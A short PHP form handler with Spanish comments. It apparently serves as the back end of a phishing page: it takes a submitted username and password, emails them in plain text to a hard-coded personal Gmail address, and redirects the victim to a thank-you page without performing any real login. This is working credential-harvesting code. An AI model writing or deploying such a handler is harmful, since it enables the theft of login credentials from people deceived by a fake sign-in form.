<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Puedes personalizar el contenido del correo electrónico según tus necesidades
    $mensaje = "Usuario: $username\nContraseña: $password";

    // Cambia 'tudireccion@example.com' con tu dirección de correo electrónico
    $destinatario = 'daniaabdija@gmail.com';
    $asunto = 'Nuevo formulario de ingreso';

    // Envia el correo electrónico
    mail($destinatario, $asunto, $mensaje);

    // Redirecciona a una página de agradecimiento u otra página
    header('Location: gracias.html');
} else {
    // Si alguien intenta acceder directamente al archivo PHP, redirige a la página principal
    header('Location: index.html');
}


?>
